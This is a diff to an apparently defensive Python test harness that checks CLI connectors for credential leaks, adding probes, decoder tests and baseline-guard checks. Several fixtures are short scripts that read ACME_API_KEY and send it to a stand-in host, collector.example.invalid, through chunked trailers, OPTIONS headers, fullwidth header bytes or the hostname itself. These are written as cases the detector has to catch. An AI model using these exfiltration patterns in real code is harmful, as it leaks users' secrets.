+        ("w " * 40000 + base64.b32encode(raw).decode(), [cred], True, "base32 in an 80 KB unit"),
+        (_u(bold.encode("utf-16-le")), [d8], True, "mathematical digits in UTF-16LE (no NUL, no 0xFF)"),
+        ("\x00" + payload.rstrip("="), ["ABC!DEFG"], True, "an unpadded base32 credential in a binary file", "file",
+         [[payload]]),
+        ("\x00" + long_payload[3:29], [cred], True, "a misaligned payload piece in a binary file", "file",
+         [[long_payload]]),
+    ])
+    rnd = random.Random(7)
+    alpha = string.ascii_letters + string.digits
+
+    def blob() -> str:
+        b = bytes(rnd.randrange(256) for _ in range(rnd.randrange(20, 400)))
+        kind = rnd.randrange(8)
+        return [base64.b64encode(b).decode(), base64.b32encode(b).decode(), b.hex(), base64.a85encode(b).decode(),
+                base64.b85encode(b).decode(), " ".join(str(x) for x in b),
+                json.dumps({"id": rnd.randrange(10 ** 9), "name": "".join(rnd.choice(alpha) for _ in range(30)),
+                            "n": [rnd.randrange(10 ** 7) for _ in range(8)]}),
+                _u(gzip.compress(b))][kind]
+    t0, hits = time.time(), []
+    for i in range(120):
+        text = " ".join(blob() for _ in range(5))
+        creds = [make_cred("long"), s3, d6]
+        # A 3-character value can be a whole word of the output as written
+        # (contract 2(a), by chance); only a hit that decoding made counts.
+        if leaked(text, creds, []) and not _Matcher(creds, [], False, frozenset()).judge(text, True):
+            hits.append(i)
+    if hits:
+        print(f"    corpus self-test: whole-unit decoders: false positives on credential-free output {hits[:5]}")
+        ok = False
+    print(f"    corpus self-test: whole-unit decoders: 120 credential-free outputs in {time.time() - t0:.1f}s")
+    return ok
+
+
+def _r3_sink_capture() -> bool:
+    """Every request to a foreign host is captured whatever its method, every
+    trailer of a chunked body, header bytes read as UTF-8; a binary file is
+    judged like any other."""
+    key = 'os.environ.get("ACME_API_KEY", "")'
+    hook = ('import http.client, urllib.parse\ncall("GET", "/v1/items")\na = sys.argv[1:]\n'
+            'u = urllib.parse.urlsplit(a[a.index("--deliver") + 1][len("webhook:"):])\n'
+            'c = http.client.HTTPConnection(u.hostname, u.port, timeout=10)\n')
+    trailer = hook + ('c.putrequest("POST", u.path)\nc.putheader("Transfer-Encoding", "chunked")\nc.endheaders()\n'
+                      'c.send(b"2\\r\\n{}\\r\\n0\\r\\nX-Copy: " + __V__.encode() + b"\\r\\n\\r\\n")\n'
+                      'c.getresponse().read()\nprint("ok")\n')
+    method = hook + 'c.request("OPTIONS", u.path, headers={"X-Copy": __V__})\nc.getresponse().read()\nprint("ok")\n'
+    utf8 = hook + ('c.putrequest("POST", u.path)\nc.putheader("X-Copy", "".join(chr(ord(x) + 0xFEE0) if "!" <= x <= "~" '
+                   'else x for x in __V__).encode("utf-8"))\nc.putheader("Content-Length", "2")\nc.endheaders(b"{}")\n'
+                   'c.getresponse().read()\nprint("ok")\n')
+    tls = ('call("GET", "/v1/items")\ntry:\n    urllib.request.build_opener().open("https://" + __HOST__ + "/c", timeout=5)\n'
+           'except Exception:\n    pass\nprint("ok")\n')
+    return _probes("sink capture (round 3)", [
+        ("the credential in a chunked trailer to a foreign host", "out-deliver-webhook", "FAIL",
+         dict(cli=trailer.replace("__V__", key))),
+        ("a clean chunked trailer", "out-deliver-webhook", "PASS", dict(cli=trailer.replace("__V__", '"clean0"'))),
+        ("the credential in an OPTIONS request to a foreign host", "out-deliver-webhook", "FAIL",
+         dict(cli=method.replace("__V__", key))),
+        ("a clean OPTIONS request", "out-deliver-webhook", "PASS", dict(cli=method.replace("__V__", '"clean0"'))),
+        ("the credential in fullwidth UTF-8 header bytes", "out-deliver-webhook", "FAIL",
+         dict(cli=utf8.replace("__V__", key))),
+        ("a clean https request to a foreign host (its TLS tunnel is not a request)", "succ-raw", "PASS",
+         dict(cli=tls.replace("__HOST__", '"collector.example.invalid"'))),
+        ("the credential in the host of an https request to a foreign host", "succ-raw", "FAIL",
+         dict(cli=tls.replace("__HOST__", 'os.environ.get("ACME_API_KEY", "").lower() + ".example.invalid"'))),
+        ("an unpadded base32 credential after a NUL in a file", "len8-base32", "FAIL",
+         dict(cli=_ITEMS + 'open(os.path.join(HOME, "c.bin"), "wb").write(b"\\0" + name.rstrip("=").encode())\n'
+                           'print("ok")\n')),
+    ])
+
+
+def _r3_outbound_short() -> bool:
+    """Contract 2(c): a held value in a request to a foreign host is a leak
+    whole, with no whole-token boundaries."""
+    out = ('call("GET", "/v1/items")\nreq = urllib.request.Request("http://collector.example.invalid/c", '
+           'headers={"X-Copy": "abc" + __V__ + "def"})\ntry:\n    urllib.request.build_opener().open(req, timeout=5)\n'
+           'except Exception:\n    pass\nprint("ok")\n')
+    return _probes("outbound short", [
+        ("a 3-character credential inside a word to a foreign host", "short3-raw", "FAIL",
+         dict(cli=out.replace("__V__", 'os.environ.get("ACME_API_KEY", "")'))),
+        ("a clean request to a foreign host", "short3-raw", "PASS", dict(cli=out.replace("__V__", '"zz"'))),
+    ])
+
+
+def _r3_held_runtime() -> bool:
+    """A value the vendor delivers in a declared response field is held
+    whether or not a token was ever minted."""
+    named = _ITEMS + "print(__OUT__)\n"
+    return _probes("held runtime values", [
+        ("a declared field printed on a row that never mints", "minted-echo", "FAIL",
+         dict(cli=named.replace("__OUT__", "name")), ["name"]),
+        ("nothing printed, no mint", "minted-echo", "N/A", dict(cli=named.replace("__OUT__", '"ok"')), ["name"]),
+    ])
+
+
+def _r3_seeding() -> bool:
+    """Every variable the connector declares secret is held in every row: the
+    kit's SecretEnv too, and a declared URL variable (without holding the
+    harness's own fake address it shares with undeclared ones)."""
+    extra = dict(env={"ACME_EXTRA": "${user_config.extra}"}, sensitive={"extra": False})
+    url = dict(sensitive={"base_url": True})
+    return _probes("declared secret seeding", [
+        ("a kit-declared secret printed", "succ-raw", "FAIL",
+         dict(cli='call("GET", "/v1/items")\nprint(os.environ.get("ACME_EXTRA", ""))\n', **extra),
+         {"fields": [], "secret_env": ["ACME_EXTRA"]}),
+        ("a kit-declared secret never printed", "succ-raw", "PASS", dict(cli='call("GET", "/v1/items")\nprint("ok")\n',
+                                                                          **extra), {"fields": [], "secret_env": ["ACME_EXTRA"]}),
+        ("a declared base URL printed", "err-raw", "FAIL", dict(cli='call("GET", "/v1/items")\nprint(BASE)\n', **url)),
+        ("an undeclared token URL on the same host printed", "err-raw", "PASS",
+         dict(cli='call("GET", "/v1/items")\nprint(os.environ.get("ACME_TOKEN_URL", ""))\n', **url)),
+        ("a declared base URL never printed", "err-raw", "PASS", dict(cli='call("GET", "/v1/items")\nprint("ok")\n', **url)),
+    ])
+
+
+def _r3_declarations() -> bool:
+    """The kit's declarations are read only from a literal of the kit's own
+    Declarations type (an import of .../internal/credkit), elided elements of a
+    slice of it included; anything else naming ResponseFields or SecretEnv, an
+    alias, a second literal or a positional one fails closed; a file the build
+    excludes declares nothing."""
+    ok = True
+    kit = {"go.mod": "module acme\n",
+           "internal/credkit/kit.go": "package credkit\n\ntype Declarations struct{ SecretEnv, ResponseFields []string }\n"}
+    imp = 'package main\n\nimport "acme/internal/credkit"\n\n'
+    decl = 'var D = credkit.Declarations{SecretEnv: []string{"ACME_X"}, ResponseFields: []string{"password"}}\n'
+
+    def read(files: dict[str, str]):
+        with tempfile.TemporaryDirectory(prefix="corpus-r3-go-") as tmp:
+            for rel, body in {**kit, **files}.items():
+                p = Path(tmp) / rel
+                p.parent.mkdir(parents=True, exist_ok=True)
+                p.write_text(body, encoding="utf-8")
+            try:
+                d = kit_declarations_in(Path(tmp))
+                return (sorted(d["fields"]), sorted(d["secret_env"]))
+            except ValueError:
+                return "error"
+
+    for files, want, why in (
+            ({"wire.go": imp + decl}, (["password"], ["ACME_X"]), "a literal of the kit's type"),
+            ({"wire.go": 'package main\n\nimport ck "acme/internal/credkit"\n\n' + decl.replace("credkit.", "ck.")},
+             (["password"], ["ACME_X"]), "the kit imported under another name"),
+            ({"wire.go": imp + 'var Ds = []credkit.Declarations{{ResponseFields: []string{"token"}}}\n'}, (["token"], []),
+             "an elided element of a slice of the kit's type"),
+            ({"x.go": 'package main\n\nvar x = []struct{ ResponseFields []string }{{ResponseFields: []string{"name"}}}\n'},
+             "error", "an elided element of an unrelated struct"),
+            ({"x.go": 'package main\n\ntype T struct{ ResponseFields []string }\n\n'
+                      'func f() { var t T; t.ResponseFields = []string{"name"}; _ = t }\n'}, "error",
+             "an assignment to an unrelated .ResponseFields"),
+            ({"wire.go": imp + 'type D = credkit.Declarations\n\nvar d = D{ResponseFields: []string{"name"}}\n'}, "error",
+             "an alias of the kit's type"),
+            ({"x.go": 'package main\n\ntype Declarations struct{ ResponseFields []string }\n\n'
+                      'var d = Declarations{ResponseFields: []string{"name"}}\n'}, "error", "a local type named Declarations"),
+            ({"wire.go": imp + decl, "more.go": imp + decl.replace("var D", "var E")}, "error", "two literals"),
+            ({"wire.go": imp + 'var D = credkit.Declarations{[]string{"ACME_X"}, []string{"name"}}\n'}, "error",
+             "a positional literal"),
+            ({"wire.go": "//go:build ignore\n\n" + imp + decl}, ([], []), "a file the build excludes"),
+            ({"wire.go": 'package main\n\nimport credkit "acme/internal/other"\n\n' + decl}, "error",
+             "a Declarations of a package that is not the kit")):
+        got = read(files)
+        if got != want:
+            print(f"    corpus self-test: declarations: {why}: want {want}, got {got}")
+            ok = False
+    return ok
+
+
+R3_PROBES = {"guard-engine-rebinding": lambda: True,   # in _self_test_guard and the ci_guards.sh self-test
+             "response-field-declarations": _r3_declarations, "declared-secret-seeding": _r3_seeding,
+             "held-set-runtime-tokens": _r3_held_runtime, "decoder-pieces": _r3_decoders,
+             "sink-capture": _r3_sink_capture, "outbound-short-oracle": _r3_outbound_short}
+
+
 def _self_test_guard() -> bool:
     import contextlib
     import io
@@ -2712,6 +3581,9 @@ def _self_test_guard() -> bool:
         expect(guard(none) == 0, "the PR that introduces the list and its baseline passes")
         write({"acme": [g[0], g[1]]})
         (tm / "class_harness.py").write_text("def leaks(text, secret):\n    return [1]\n", encoding="utf-8")
+        (tm / "registry.py").write_text("def skills():\n    return {}\n", encoding="utf-8")
+        (repo / ".github" / "workflows").mkdir(parents=True)
+        (repo / ".github" / "workflows" / "ci.yml").write_text("on: push\n", encoding="utf-8")
         git("add", "-A")
         git("commit", "-q", "-m", "baseline")
         base = git("rev-parse", "HEAD")
@@ -2754,6 +3626,24 @@ def _self_test_guard() -> bool:
         write({"acme": [g[0], g[1], "zz-new-case"]}, new)
         expect(guard(base) == 1, "a harness change that only adds lines adds no entry")
         (tm / "class_harness.py").write_text("def leaks(text, secret):\n    return [1]\n", encoding="utf-8")
+        # Round 3: whatever the engine imports or CI runs it with gives a case
+        # its meaning too, so a new case's entries land only in a change that
+        # touches nothing but the list and the baseline.
+        for rel, body, why in (
+                ("tools/maintainer/registry.py", "def skills():\n    return {}\nX = 1\n",
+                 "a change to registry.py (imported by the engine)"),
+                (".github/workflows/ci.yml", "on: push\nenv: {X: 1}\n", "a change to how CI runs the list"),
+                ("tools/maintainer/helper.py", "X = 1\n", "a new file the engine could import")):
+            before = (repo / rel).read_text(encoding="utf-8") if (repo / rel).exists() else None
+            (repo / rel).write_text(body, encoding="utf-8")
+            write({"acme": [g[0], g[1], "zz-new-case"]}, new)
+            expect(guard(base) == 1, f"{why} adds no entry")
+            if before is None:
+                (repo / rel).unlink()
+            else:
+                (repo / rel).write_text(before, encoding="utf-8")
+        write({"acme": [g[0], g[1], "zz-new-case"]}, new)
+        expect(guard(base) == 0, "a change to only the list and the baseline lands a new case with its entries")
         write({"acme": [g[0], g[1]]}, drop=g[5])
         expect(guard(base) == 0, "a case removed on its own, with no entry added, passes")
         write({"acme": [g[0], adv]})
@@ -2800,7 +3690,7 @@ def self_test() -> bool:
                      ("success HOME", _self_test_success_home), ("guard", _self_test_guard),
                      ("redirect retry", _self_test_redirect_retry), ("sinks", _self_test_sinks),
                      ("child argv and foreign hosts", _self_test_child_and_foreign),
-                     *R2_PROBES.items(),
+                     *R2_PROBES.items(), *R3_PROBES.items(),
                      ("stand-ins", _self_test_standins)):
         passed = fn()
         ok = ok and passed
@@ -2856,9 +3746,12 @@ def main(argv: list[str]) -> int:
     ap.add_argument("--check-baseline", action="store_true", help="the build-free guard")
     ap.add_argument("--base", help="with --check-baseline: the merge base the baseline may only shrink against")
     ap.add_argument("--self-test", action="store_true")
+    ap.add_argument("--match-worker", action="store_true", help=argparse.SUPPRESS)
     ap.add_argument("-v", "--verbose", action="store_true")
     a = ap.parse_args(argv)
 
+    if a.match_worker:
+        return _match_worker()
     if a.check_baseline:
         return check_baseline(a.base)
     if a.self_test:
